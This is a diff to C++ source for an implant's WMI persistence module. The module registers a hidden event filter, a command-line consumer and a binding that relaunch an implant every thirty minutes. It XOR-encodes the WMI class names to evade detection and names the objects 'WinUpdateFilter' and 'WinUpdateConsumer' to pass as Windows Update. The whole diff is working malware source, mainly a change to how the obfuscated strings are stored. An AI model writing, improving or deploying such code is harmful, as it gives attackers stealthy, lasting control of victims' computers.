@@ -9,15 +9,11 @@
 namespace persistence {
 
 namespace {
-    // Corrected XOR strings (key 0x5A)
-    // "ROOT\\subscription"
-    std::wstring kRootSub = L"\x08\x15\x15\x0E\x06\x06\x29\x2F\x38\x29\x39\x28\x33\x2A\x2E\x33\x35\x34";
-    // "__EventFilter"
-    std::wstring kEventFilter = L"\x05\x05\x1F\x2C\x3F\x34\x2E\x1C\x33\x36\x2E\x3F\x28";
-    // "CommandLineEventConsumer"
-    std::wstring kConsumer = L"\x19\x35\x37\x37\x3B\x34\x3E\x16\x33\x34\x3F\x1F\x2C\x3F\x34\x2E\x19\x35\x34\x29\x2F\x37\x3F\x28";
-    // "__FilterToConsumerBinding"
-    std::wstring kBinding = L"\x05\x05\x1C\x33\x36\x2E\x3F\x28\x0E\x35\x19\x35\x34\x29\x2F\x37\x3F\x28\x18\x33\x34\x3E\x33\x34\x3D";
+    // XOR strings (key 0x5A)
+    const wchar_t kRootSubEnc[] = { 0x08, 0x15, 0x15, 0x0E, 0x06, 0x06, 0x29, 0x2F, 0x38, 0x29, 0x39, 0x28, 0x33, 0x2A, 0x2E, 0x33, 0x35, 0x34 }; // ROOT\\subscription
+    const wchar_t kEventFilterEnc[] = { 0x05, 0x05, 0x1F, 0x2C, 0x3F, 0x34, 0x2E, 0x1C, 0x33, 0x36, 0x2E, 0x3F, 0x28 }; // __EventFilter
+    const wchar_t kConsumerEnc[] = { 0x19, 0x35, 0x37, 0x37, 0x3B, 0x34, 0x3E, 0x16, 0x33, 0x34, 0x3F, 0x1F, 0x2C, 0x3F, 0x34, 0x2E, 0x19, 0x35, 0x34, 0x29, 0x2F, 0x37, 0x3F, 0x28 }; // CommandLineEventConsumer
+    const wchar_t kBindingEnc[] = { 0x05, 0x05, 0x1C, 0x33, 0x36, 0x2E, 0x3F, 0x28, 0x0E, 0x35, 0x19, 0x35, 0x34, 0x29, 0x2F, 0x37, 0x3F, 0x28, 0x18, 0x33, 0x34, 0x3E, 0x33, 0x34, 0x3D }; // __FilterToConsumerBinding
 }
 
 bool WmiPersistence::Install(const std::wstring& implantPath, const std::wstring& taskName) {
@@ -28,7 +24,7 @@ bool WmiPersistence::Install(const std::wstring& implantPath, const std::wstring
     hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
     if (FAILED(hr)) return false;
 
-    hr = pLoc->ConnectServer((BSTR)_bstr_t(utils::DecryptW(kRootSub).c_str()), NULL, NULL, 0, 0, 0, 0, &pSvc);
+    hr = pLoc->ConnectServer((BSTR)_bstr_t(utils::DecryptW(kRootSubEnc, 18).c_str()), NULL, NULL, 0, 0, 0, 0, &pSvc);
     if (FAILED(hr)) {
         pLoc->Release();
         return false;
@@ -46,7 +42,7 @@ bool WmiPersistence::Install(const std::wstring& implantPath, const std::wstring
                          L"(TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute = 0 OR TargetInstance.Minute = 30))";
 
     IWbemClassObject* pFilterClass = nullptr;
-    hr = pSvc->GetObject((BSTR)_bstr_t(utils::DecryptW(kEventFilter).c_str()), 0, NULL, &pFilterClass, NULL);
+    hr = pSvc->GetObject((BSTR)_bstr_t(utils::DecryptW(kEventFilterEnc, 13).c_str()), 0, NULL, &pFilterClass, NULL);
     if (FAILED(hr)) { pSvc->Release(); pLoc->Release(); return false; }
 
     IWbemClassObject* pFilterInstance = nullptr;
@@ -77,7 +73,7 @@ bool WmiPersistence::Install(const std::wstring& implantPath, const std::wstring
 
     std::wstring consumerName = L"WinUpdateConsumer_" + taskName;
     IWbemClassObject* pConsumerClass = nullptr;
-    hr = pSvc->GetObject((BSTR)_bstr_t(utils::DecryptW(kConsumer).c_str()), 0, NULL, &pConsumerClass, NULL);
+    hr = pSvc->GetObject((BSTR)_bstr_t(utils::DecryptW(kConsumerEnc, 24).c_str()), 0, NULL, &pConsumerClass, NULL);
     IWbemClassObject* pConsumerInstance = nullptr;
     pConsumerClass->SpawnInstance(0, &pConsumerInstance);
 
@@ -94,12 +90,12 @@ bool WmiPersistence::Install(const std::wstring& implantPath, const std::wstring
     hr = pSvc->PutInstance(pConsumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
 
     IWbemClassObject* pBindingClass = nullptr;
-    hr = pSvc->GetObject((BSTR)_bstr_t(utils::DecryptW(kBinding).c_str()), 0, NULL, &pBindingClass, NULL);
+    hr = pSvc->GetObject((BSTR)_bstr_t(utils::DecryptW(kBindingEnc, 25).c_str()), 0, NULL, &pBindingClass, NULL);
     IWbemClassObject* pBindingInstance = nullptr;
     pBindingClass->SpawnInstance(0, &pBindingInstance);
 
-    std::wstring filterRelPath = utils::DecryptW(kEventFilter) + L".Name=\"" + filterName + L"\"";
-    std::wstring consumerRelPath = utils::DecryptW(kConsumer) + L".Name=\"" + consumerName + L"\"";
+    std::wstring filterRelPath = utils::DecryptW(kEventFilterEnc, 13) + L".Name=\"" + filterName + L"\"";
+    std::wstring consumerRelPath = utils::DecryptW(kConsumerEnc, 24) + L".Name=\"" + consumerName + L"\"";
 
     var.vt = VT_BSTR;
     var.bstrVal = SysAllocString(filterRelPath.c_str());
@@ -133,11 +129,11 @@ bool WmiPersistence::Verify(const std::wstring& taskName) {
     hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
     if (FAILED(hr)) return false;
 
-    hr = pLoc->ConnectServer((BSTR)_bstr_t(utils::DecryptW(kRootSub).c_str()), NULL, NULL, 0, 0, 0, 0, &pSvc);
+    hr = pLoc->ConnectServer((BSTR)_bstr_t(utils::DecryptW(kRootSubEnc, 18).c_str()), NULL, NULL, 0, 0, 0, 0, &pSvc);
     if (FAILED(hr)) { pLoc->Release(); return false; }
 
     std::wstring filterName = L"WinUpdateFilter_" + taskName;
-    std::wstring relPath = utils::DecryptW(kEventFilter) + L".Name=\"" + filterName + L"\"";
+    std::wstring relPath = utils::DecryptW(kEventFilterEnc, 13) + L".Name=\"" + filterName + L"\"";
 
     IWbemClassObject* pObj = nullptr;
     hr = pSvc->GetObject((BSTR)_bstr_t(relPath.c_str()), 0, NULL, &pObj, NULL);
